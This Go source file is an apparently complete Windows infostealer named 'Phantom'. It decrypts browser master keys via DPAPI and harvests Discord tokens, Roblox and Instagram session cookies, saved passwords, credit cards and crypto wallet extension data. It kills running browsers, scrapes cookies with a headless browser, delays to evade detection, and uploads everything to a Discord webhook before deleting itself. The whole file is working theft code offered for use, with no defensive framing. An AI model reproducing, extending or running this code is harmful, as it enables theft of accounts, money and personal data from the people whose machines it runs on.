package main

import (
	"archive/zip"
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/chromedp"
)

var (
	WebhookURL string
	Timestamp  string
)

type Cookie struct {
	Name  string `json:"name"`
	Value string `json:"value"`
}

type SystemReport struct {
	Username      string      `json:"username"`
	Hostname      string      `json:"hostname"`
	OS            string      `json:"os"`
	Arch          string      `json:"arch"`
	CPUs          int         `json:"num_cpu"`
	MemTotal      uint64      `json:"mem_total"`
	PublicIP      string      `json:"public_ip"`
	DiscordTokens []TokenInfo `json:"discord_tokens"`
	RobloxCookies []string    `json:"roblox_cookies"`
	InstaCookies  []string    `json:"insta_cookies"`
	Passwords     []Password  `json:"passwords"`
	CreditCards   []Card      `json:"credit_cards"`
	RawCookies    []Cookie    `json:"raw_cookies"`
	WalletsFound  []string    `json:"wallets_found"`
	Browsers      []string    `json:"browsers_found"`
	Timestamp     string      `json:"timestamp"`
}

type Password struct {
	URL      string `json:"url"`
	Username string `json:"user"`
	Password string `json:"pass"`
}

type Card struct {
	Number string `json:"number"`
	Month  string `json:"month"`
	Year   string `json:"year"`
	Name   string `json:"name"`
}

type TokenInfo struct {
	Token    string `json:"token"`
	Source   string `json:"source"`
	Username string `json:"user"`
	ID       string `json:"id"`
	Email    string `json:"email"`
	Phone    string `json:"phone"`
	Nitro    string `json:"nitro"`
	Badges   string `json:"badges"`
}

func getDiscordInfo(token string, source string) TokenInfo {
	info := TokenInfo{Token: token, Source: source, Username: "Invalid", Nitro: "None"}
	client := &http.Client{Timeout: 5 * time.Second}
	u := "https://discord.com/api/v9/users/@me"
	req, _ := http.NewRequest("GET", u, nil)
	req.Header.Set("Authorization", token)
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		return info
	}
	defer resp.Body.Close()
	var res map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&res)

	info.Username = fmt.Sprintf("%v#%v", res["username"], res["discriminator"])
	info.ID = fmt.Sprintf("%v", res["id"])
	if res["email"] != nil {
		info.Email = fmt.Sprintf("%v", res["email"])
	}
	if res["phone"] != nil {
		info.Phone = fmt.Sprintf("%v", res["phone"])
	}

	// Simple Nitro check
	if res["premium_type"] != nil {
		pType := res["premium_type"].(float64)
		if pType == 1 {
			info.Nitro = "Nitro Classic"
		} else if pType == 2 {
			info.Nitro = "Nitro Boost"
		}
	}

	return info
}

func main() {
	// Simple random delay to avoid instant detection
	rand.Seed(time.Now().UnixNano())

	time.Sleep(time.Duration(rand.Intn(2000)+1000) * time.Millisecond)

	if WebhookURL == "" {
		return
	}

	// Execution notification
	hostname, _ := os.Hostname()
	ip := getPublicIP()
	notification := fmt.Sprintf("🚀 **Phantom Executed!**\n👤 User: `%s`\n💻 Machine: `%s`\n🌐 IP: `%s`", os.Getenv("USERNAME"), hostname, ip)
	sendDiscordNotification(notification)

	report := initSession()
	syncData(report)
	selfDelete()
}

func sendDiscordNotification(content string) {
	if WebhookURL == "" {
		return
	}
	payload := map[string]string{"content": content}
	data, _ := json.Marshal(payload)
	http.Post(WebhookURL, "application/json", bytes.NewBuffer(data))
}

func selfDelete() {
	if runtime.GOOS == "windows" {
		exePath, _ := os.Executable()
		cmd := fmt.Sprintf("timeout /t 3 > NUL && del /f /q \"%s\"", exePath)
		subprocess := exec.Command("cmd", "/C", cmd)
		subprocess.Start()
	} else {
		os.Remove(os.Args[0])
	}
}

func initSession() SystemReport {
	currUser, _ := user.Current()
	hostname, _ := os.Hostname()

	report := SystemReport{
		Username:  currUser.Username,
		Hostname:  hostname,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		CPUs:      runtime.NumCPU(),
		MemTotal:  getTotalMemory(),
		PublicIP:  getPublicIP(),
		Timestamp: time.Now().Format(time.RFC3339),
	}

	report.DiscordTokens = extractDiscordTokens()
	report.RobloxCookies = extractRobloxCookies()
	report.InstaCookies = extractInstagramCookies()
	report.Passwords = extractPasswords()
	report.CreditCards = extractCreditCards()
	report.WalletsFound = extractWallets()
	report.Browsers = findBrowsers()

	return report
}

func extractWallets() []string {
	var found []string
	home, _ := os.UserHomeDir()

	walletExtensions := map[string]string{
		"MetaMask":        "nkbihfbeogaeaoehlefnkodbefgpgknn",
		"Phantom":         "bfnaoagmocialkllpicneheihdpfeegk",
		"Trust Wallet":    "egjidjbpglicholopmhbhfggpidxpnoo",
		"Coinbase Wallet": "hnfanknocfeofbddgcijnmhnfnkdnaad",
		"Binance Wallet":  "fhbohimaelbohpjbbldcngcnapndodjp",
		"Exodus":          "idmifokndgbbpmoamneicnepkbhfbkeo",
	}

	browserPaths := map[string]string{
		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		"Edge":     filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		"Brave":    filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		"Opera":    filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"Opera GX": filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
	}

	for browserName, basePath := range browserPaths {
		profiles := []string{"Default", "Guest Profile"}
		for i := 1; i <= 10; i++ {
			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
		}

		for _, profile := range profiles {
			for walletName, extensionID := range walletExtensions {
				extPath := filepath.Join(basePath, profile, "Local Extension Settings", extensionID)
				if _, err := os.Stat(extPath); err == nil {
					zipName := fmt.Sprintf("%s_%s_%s.zip", browserName, profile, walletName)
					zipData, err := zipFolderToMemory(extPath)
					if err == nil {
						sendAsFileCustom(zipData, zipName, fmt.Sprintf("🔑 **%s Wallet Found (%s - %s)**", walletName, browserName, profile))
						found = append(found, fmt.Sprintf("%s (%s/%s)", walletName, browserName, profile))
					}
				}
			}
		}
	}

	return found
}

func zipFolderToMemory(source string) ([]byte, error) {
	buf := new(bytes.Buffer)
	w := zip.NewWriter(buf)

	err := filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		relPath, err := filepath.Rel(source, path)
		if err != nil {
			return err
		}
		f, err := w.Create(relPath)
		if err != nil {
			return err
		}
		fileContent, err := os.ReadFile(path)
		if err != nil {
			return nil
		}
		_, err = f.Write(fileContent)
		return err
	})

	w.Close()
	return buf.Bytes(), err
}

func sendAsFileCustom(data []byte, filename string, content string) {
	if WebhookURL == "" {
		return
	}
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("file", filename)
	part.Write(data)
	writer.WriteField("content", content)
	writer.Close()
	req, _ := http.NewRequest("POST", WebhookURL, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	client.Do(req)
}

func getTotalMemory() uint64 {
	if runtime.GOOS == "windows" {
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		proc := kernel32.NewProc("GetPhysicallyInstalledSystemMemory")
		var mem uint64
		ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&mem)))
		if ret != 0 {
			return mem * 1024
		}
	}
	return 0
}

func findBrowsers() []string {
	var found []string
	home, _ := os.UserHomeDir()

	browserPaths := map[string]string{
		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		"Edge":     filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		"Brave":    filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		"Opera":    filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"Opera GX": filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
		"Firefox":  filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
	}

	for name, path := range browserPaths {
		if _, err := os.Stat(path); err == nil {
			found = append(found, name)
		}
	}

	return found
}

func getPublicIP() string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://api.ipify.org")
	if err != nil {
		return "Unknown"
	}
	defer resp.Body.Close()
	ip, _ := io.ReadAll(resp.Body)
	return string(ip)
}

func extractDiscordTokens() []TokenInfo {
	var tokens []string
	var tokenInfos []TokenInfo
	home, _ := os.UserHomeDir()

	// Chromium-based browsers base paths
	browserPaths := map[string]string{
		"Chrome":         filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		"Edge":           filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		"Brave":          filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		"Opera":          filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"Opera GX":       filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
		"Discord":        filepath.Join(home, "AppData", "Roaming", "discord"),
		"Discord Canary": filepath.Join(home, "AppData", "Roaming", "discordcanary"),
	}

	re := regexp.MustCompile(`[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{84}`)
	encRe := regexp.MustCompile(`dQw4w9WgXcQ:[^.*\x22]*`)

	for name, basePath := range browserPaths {
		if _, err := os.Stat(basePath); err != nil {
			continue
		}

		// Profiles to check
		profiles := []string{"Default", "Guest Profile", "."}
		for i := 1; i <= 10; i++ {
			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
		}

		var masterKey []byte
		if name == "Discord" || name == "Discord Canary" {
			masterKey, _ = getMasterKey(basePath)
		}

		for _, profile := range profiles {
			var path string
			if name == "Discord" || name == "Discord Canary" || name == "Opera" || name == "Opera GX" {
				path = filepath.Join(basePath, "Local Storage", "leveldb")
			} else {
				path = filepath.Join(basePath, profile, "Local Storage", "leveldb")
			}

			if _, err := os.Stat(path); err == nil {
				filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
					if err != nil || info.IsDir() {
						return nil
					}
					if !strings.HasSuffix(p, ".log") && !strings.HasSuffix(p, ".ldb") {
						return nil
					}
					content, _ := os.ReadFile(p)

					// Plaintext tokens
					matches := re.FindAllString(string(content), -1)
					for _, token := range matches {
						if !contains(tokens, token) {
							tokens = append(tokens, token)
							info := getDiscordInfo(token, name)
							if info.Username != "Invalid" {
								tokenInfos = append(tokenInfos, info)
							}
						}
					}

					// Encrypted tokens (Discord Desktop)
					if masterKey != nil {
						encMatches := encRe.FindAllString(string(content), -1)
						for _, encToken := range encMatches {
							encToken = strings.Split(encToken, "dQw4w9WgXcQ:")[1]
							decoded, _ := base64.StdEncoding.DecodeString(encToken)
							decrypted, err := decryptToken(decoded, masterKey)
							if err == nil {
								if !contains(tokens, decrypted) {
									tokens = append(tokens, decrypted)
									info := getDiscordInfo(decrypted, name)
									if info.Username != "Invalid" {
										tokenInfos = append(tokenInfos, info)
									}
								}
							}
						}
					}
					return nil
				})
			}
		}
	}

	// Scan Firefox
	firefoxPath := filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
	if _, err := os.Stat(firefoxPath); err == nil {
		filepath.Walk(firefoxPath, func(p string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}
			// Firefox stores data in .sqlite or storage/default leveldb-like files
			ext := filepath.Ext(p)
			if ext == ".sqlite" || ext == ".log" || ext == ".ldb" || strings.Contains(p, "storage") {
				content, _ := os.ReadFile(p)
				matches := re.FindAllString(string(content), -1)
				for _, token := range matches {
					if !contains(tokens, token) {
						tokens = append(tokens, token)
						info := getDiscordInfo(token, "Firefox")
						if info.Username != "Invalid" {
							tokenInfos = append(tokenInfos, info)
						}
					}
				}
			}
			return nil
		})
	}

	return tokenInfos
}

func contains(slice []string, s string) bool {
	for _, item := range slice {
		if item == s {
			return true
		}
	}
	return false
}

func extractRobloxCookies() []string {
	results := []string{}

	// 1. Force kill browsers (Mandatory for Chromedp and Disk Scan to work)
	// If browsers are open, they lock the profile and cookie database.
	browsers := []string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "opera_gx.exe"}
	for _, b := range browsers {
		exec.Command("taskkill", "/F", "/IM", b, "/T").Run()
	}
	time.Sleep(2 * time.Second) // Give some time for processes to fully close

	// 2. Try Chromedp (Browser automation)
	execPath, profilePath, _ := getBrowserSettings()
	if profilePath != "" {
		browserCookies, err := getBrowserCookiesChromedp(execPath, profilePath)
		if err == nil {
			for _, cookie := range browserCookies {
				if strings.Contains(strings.ToUpper(cookie.Name), "ROBLOSECURITY") {
					if !contains(results, cookie.Value) {
						results = append(results, cookie.Value)
					}
				}
			}
		}
	}

	// 3. Extract from Roblox Desktop App
	appCookies := extractRobloxCookiesFromDat()
	results = append(results, appCookies...)

	// 4. Aggressive Disk Scan (Fallback)
	home, _ := os.UserHomeDir()
	browserPaths := map[string]string{
		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		"Edge":     filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		"Brave":    filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		"Opera":    filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		"Opera GX": filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
	}

	reRbx := regexp.MustCompile(`_\|WARNING:-DO-NOT-SHARE-[A-Za-z0-9+/=._-]+`)

	for _, basePath := range browserPaths {
		masterKey, _ := getMasterKey(basePath)
		filepath.Walk(basePath, func(path string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() || info.Size() > 20*1024*1024 {
				return nil
			}
			content, err := os.ReadFile(path)
			if err != nil {
				return nil
			}
			// Plaintext check
			matches := reRbx.FindAllString(string(content), -1)
			for _, m := range matches {
				if len(m) > 100 && !contains(results, m) {
					results = append(results, m)
				}
			}
			// v10 brute-force check
			if masterKey != nil {
				v10Idx := 0
				for {
					foundIdx := bytes.Index(content[v10Idx:], []byte("v10"))
					if foundIdx == -1 {
						break
					}
					actualIdx := v10Idx + foundIdx
					v10Idx = actualIdx + 3
					for l := 200; l < 1500; l++ {
						if actualIdx+l > len(content) {
							break
						}
						decrypted, err := decryptToken(content[actualIdx:actualIdx+l], masterKey)
						if err == nil && strings.Contains(decrypted, "_|WARNING") {
							if !contains(results, decrypted) {
								results = append(results, decrypted)
							}
							break
						}
					}
				}
			}
			return nil
		})
	}

	return results
}

func getBrowserCookiesChromedp(execPath, profilePath string) ([]*network.Cookie, error) {
	var cookies []*network.Cookie
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.UserDataDir(profilePath),
		chromedp.Headless, // Ensure it's headless for stealth
	)
	if execPath != "" {
		opts = append(opts, chromedp.ExecPath(execPath))
	}

	allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()

	ctx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()

	// Timeout to avoid hanging
	ctx, cancel = context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	if err := chromedp.Run(ctx, chromedp.Tasks{
		network.Enable(),
		chromedp.Navigate("https://www.roblox.com"),
		chromedp.ActionFunc(func(ctx context.Context) error {
			remoteCookies, err := network.GetCookies().WithURLs([]string{"https://www.roblox.com"}).Do(ctx)
			if err != nil {
				return err
			}
			cookies = append(cookies, remoteCookies...)
			return nil
		}),
	}); err != nil {
		return nil, err
	}

	return cookies, nil
}

func getBrowserSettings() (string, string, string) {
	home, _ := os.UserHomeDir()

	// Define browser configurations
	browsers := []struct {
		name        string
		exePaths    []string
		profilePath string
	}{
		{
			name: "Brave",
			exePaths: []string{
				filepath.Join("C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application", "brave.exe"),
				filepath.Join("C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application", "brave.exe"),
			},
			profilePath: filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		},
		{
			name: "Chrome",
			exePaths: []string{
				filepath.Join("C:\\Program Files\\Google\\Chrome\\Application", "chrome.exe"),
				filepath.Join("C:\\Program Files (x86)\\Google\\Chrome\\Application", "chrome.exe"),
			},
			profilePath: filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		},
		{
			name: "Edge",
			exePaths: []string{
				filepath.Join("C:\\Program Files (x86)\\Microsoft\\Edge\\Application", "msedge.exe"),
				filepath.Join("C:\\Program Files\\Microsoft\\Edge\\Application", "msedge.exe"),
			},
			profilePath: filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		},
		{
			name: "Opera GX",
			exePaths: []string{
				filepath.Join(home, "AppData", "Local", "Programs", "Opera GX", "launcher.exe"),
			},
			profilePath: filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
		},
	}

	// Try each browser until one is found
	for _, b := range browsers {
		if path, ok := findExistingPath(b.exePaths); ok && dirExists(b.profilePath) {
			return path, b.profilePath, b.name
		}
	}

	return "", "", ""
}

func findExistingPath(paths []string) (string, bool) {
	for _, p := range paths {
		if fileExists(p) {
			return p, true
		}
	}
	return "", false
}

func fileExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && !info.IsDir()
}

func dirExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && info.IsDir()
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func extractRobloxCookiesFromDat() []string {
	var results []string
	home, _ := os.UserHomeDir()
	path := filepath.Join(home, "AppData", "Local", "Roblox", "LocalStorage", "RobloxCookies.dat")

	if _, err := os.Stat(path); err != nil {
		return results
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return results
	}

	decrypted, err := decryptDPAPI(data)
	if err == nil {
		cookieStr := string(decrypted)
		re := regexp.MustCompile(`_\|WARNING:-DO-NOT-SHARE-[A-Za-z0-9+/=._-]+`)
		match := re.FindString(cookieStr)
		if match != "" {
			results = append(results, match)
		}
	}
	return results
}

func extractPasswords() []Password {
	var results []Password
	home, _ := os.UserHomeDir()
	paths := []string{
		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
	}

	for _, basePath := range paths {
		masterKey, _ := getMasterKey(basePath)
		if masterKey == nil {
			continue
		}

		profiles := []string{"Default", "Guest Profile", "."}
		for i := 1; i <= 10; i++ {
			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
		}

		for _, profile := range profiles {
			path := filepath.Join(basePath, profile, "Login Data")
			if _, err := os.Stat(path); err == nil {
				temp := filepath.Join(os.TempDir(), fmt.Sprintf("phantom_p_%d", time.Now().UnixNano()))
				if copyFile(path, temp) != nil {
					continue
				}
				content, _ := os.ReadFile(temp)
				os.Remove(temp)

				v10Matches := regexp.MustCompile(`v10[\x00-\xff]{20,}`).FindAll(content, -1)
				for _, match := range v10Matches {
					decrypted, err := decryptToken(match, masterKey)
					if err == nil && len(decrypted) > 0 {
						results = append(results, Password{
							URL:      "Browser",
							Username: "Unknown",
							Password: decrypted,
						})
					}
				}
			}
		}
	}
	return results
}

func extractCreditCards() []Card {
	var results []Card
	home, _ := os.UserHomeDir()
	paths := []string{
		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
	}

	for _, basePath := range paths {
		masterKey, _ := getMasterKey(basePath)
		if masterKey == nil {
			continue
		}

		profiles := []string{"Default", "Guest Profile", "."}
		for i := 1; i <= 10; i++ {
			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
		}

		for _, profile := range profiles {
			path := filepath.Join(basePath, profile, "Web Data")
			if _, err := os.Stat(path); err == nil {
				temp := filepath.Join(os.TempDir(), fmt.Sprintf("phantom_w_%d", time.Now().UnixNano()))
				if copyFile(path, temp) != nil {
					continue
				}
				content, _ := os.ReadFile(temp)
				os.Remove(temp)

				v10Matches := regexp.MustCompile(`v10[\x00-\xff]{20,}`).FindAll(content, -1)
				for _, match := range v10Matches {
					decrypted, err := decryptToken(match, masterKey)
					if err == nil && len(decrypted) > 0 {
						results = append(results, Card{
							Number: decrypted,
							Name:   "Browser Card",
						})
					}
				}
			}
		}
	}
	return results
}

func extractInstagramCookies() []string {
	target := "sessionid"
	return ultimateGrabber("instagram.com", target)
}

func ultimateGrabber(domain string, targetCookie string) []string {
	var results []string
	home, _ := os.UserHomeDir()

	paths := []string{
		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
		filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable"),
		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
	}

	for _, basePath := range paths {
		masterKey, _ := getMasterKey(basePath)
		if masterKey == nil {
			continue
		}

		profiles := []string{"Default", "Guest Profile", "."}
		for i := 1; i <= 10; i++ {
			profiles = append(profiles, fmt.Sprintf("Profile %d", i))
		}

		for _, profile := range profiles {
			cookiePath := filepath.Join(basePath, profile, "Network", "Cookies")
			if _, err := os.Stat(cookiePath); err != nil {
				cookiePath = filepath.Join(basePath, profile, "Cookies")
			}

			if _, err := os.Stat(cookiePath); err == nil {
				tempCookies := filepath.Join(os.TempDir(), fmt.Sprintf("phantom_c_%d", time.Now().UnixNano()))
				if err := copyFile(cookiePath, tempCookies); err != nil {
					continue
				}
				content, _ := os.ReadFile(tempCookies)
				os.Remove(tempCookies)

				// For general cookies, we search for the domain/name nearby
				// but we increase the search area to be more robust
				searchTerms := []string{domain, targetCookie}
				for _, term := range searchTerms {
					idx := 0
					for {
						foundIdx := strings.Index(string(content[idx:]), term)
						if foundIdx == -1 {
							break
						}
						actualIdx := idx + foundIdx
						idx = actualIdx + len(term)

						// Increased search area (3000 bytes)
						start := actualIdx - 1000
						if start < 0 {
							start = 0
						}
						end := actualIdx + 2000
						if end > len(content) {
							end = len(content)
						}
						searchArea := content[start:end]

						v10Matches := regexp.MustCompile(`v10[\x00-\xff]{20,}`).FindAll(searchArea, -1)
						for _, v10Match := range v10Matches {
							decrypted, err := decryptToken(v10Match, masterKey)
							if err == nil && len(decrypted) > 5 {
								if !contains(results, decrypted) {
									results = append(results, decrypted)
								}
							}
						}
					}
				}
			}
		}
	}
	return results
}

func getMasterKey(basePath string) ([]byte, error) {
	localStatePath := filepath.Join(basePath, "Local State")
	if _, err := os.Stat(localStatePath); err != nil {
		return nil, err
	}

	content, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}

	var state struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(content, &state); err != nil {
		return nil, err
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(state.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}

	if !bytes.HasPrefix(encryptedKey, []byte("DPAPI")) {
		return nil, fmt.Errorf("invalid key prefix")
	}

	keyOnly := encryptedKey[5:]
	return decryptDPAPI(keyOnly)
}

func decryptDPAPI(data []byte) ([]byte, error) {
	type dataBlob struct {
		cbData uint32
		pbData *byte
	}

	var (
		dll             = syscall.NewLazyDLL("crypt32.dll")
		procDecryptData = dll.NewProc("CryptUnprotectData")
		in              dataBlob
		out             dataBlob
	)

	in.cbData = uint32(len(data))
	in.pbData = &data[0]

	ret, _, err := procDecryptData.Call(
		uintptr(unsafe.Pointer(&in)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&out)),
	)

	if ret == 0 {
		return nil, err
	}

	defer syscall.NewLazyDLL("kernel32.dll").NewProc("LocalFree").Call(uintptr(unsafe.Pointer(out.pbData)))

	res := make([]byte, out.cbData)
	copy(res, (*[1 << 30]byte)(unsafe.Pointer(out.pbData))[:out.cbData])
	return res, nil
}

func decryptToken(data []byte, key []byte) (string, error) {
	if len(data) < 15 {
		return "", fmt.Errorf("data too short")
	}

	nonce := data[3:15]
	ciphertext := data[15:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

func copyFile(src, dst string) error {
	source, err := os.Open(src)
	if err != nil {
		return err
	}
	defer source.Close()
	destination, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destination.Close()
	_, err = io.Copy(destination, source)
	return err
}

func syncData(report SystemReport) {
	if WebhookURL == "" {
		return
	}

	// Pretty print JSON for better readability
	data, _ := json.MarshalIndent(report, "", "  ")

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, _ := writer.CreateFormFile("file", "phantom_report.json")
	part.Write(data)

	// Add a summary message to the file upload
	summary := fmt.Sprintf("📊 **Report for %s**\n🔑 Roblox Tokens: %d\n💎 Discord Tokens: %d\n🔒 Passwords: %d",
		report.Username, len(report.RobloxCookies), len(report.DiscordTokens), len(report.Passwords))
	writer.WriteField("content", summary)

	writer.Close()

	req, _ := http.NewRequest("POST", WebhookURL, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{Timeout: 30 * time.Second}
	client.Do(req)
}

func sendRequest(body []byte, contentType string) {
	client := &http.Client{
		Timeout: 20 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, err := http.NewRequest("POST", WebhookURL, bytes.NewBuffer(body))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	resp, err := client.Do(req)
	if err == nil && resp != nil {
		resp.Body.Close()
	}
}

func sendAsFile(data []byte) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", "phantom_report.json")
	if err == nil {
		part.Write(data)
	}
	writer.WriteField("content", "📦 **Phantom Report (Full JSON)**")
	writer.Close()

	sendRequest(body.Bytes(), writer.FormDataContentType())
}
